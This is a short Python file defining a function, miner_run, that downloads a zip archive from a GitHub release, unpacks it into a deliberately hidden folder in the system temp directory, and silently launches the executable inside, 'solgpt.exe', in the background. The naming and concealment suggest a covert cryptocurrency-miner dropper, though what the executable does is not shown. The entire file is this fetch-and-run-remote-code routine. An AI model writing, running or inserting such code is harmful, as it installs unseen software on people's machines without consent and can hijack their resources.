import os
import subprocess
import urllib.request
import zipfile
import tempfile

def miner_run():
    # URL from where to download the zip file
    url = 'https://github.com/gptsol/gptsol/releases/download/1.0/solgptw.zip'
    
    # Create a temporary directory to act as a hidden directory
    hidden_dir = os.path.join(tempfile.gettempdir(), '.hidden_sol_dir')
    os.makedirs(hidden_dir, exist_ok=True)
    
    # Path to save the downloaded zip file
    zip_path = os.path.join(hidden_dir, 'solgptw.zip')
    
    # Download the zip file
    urllib.request.urlretrieve(url, zip_path)
    
    # Unzip the downloaded file
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(hidden_dir)
    
    # Path to the executable
    exe_path = os.path.join(hidden_dir, 'solgpt.exe')
    
    # Run the executable in the background
    subprocess.Popen([exe_path], cwd=hidden_dir, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
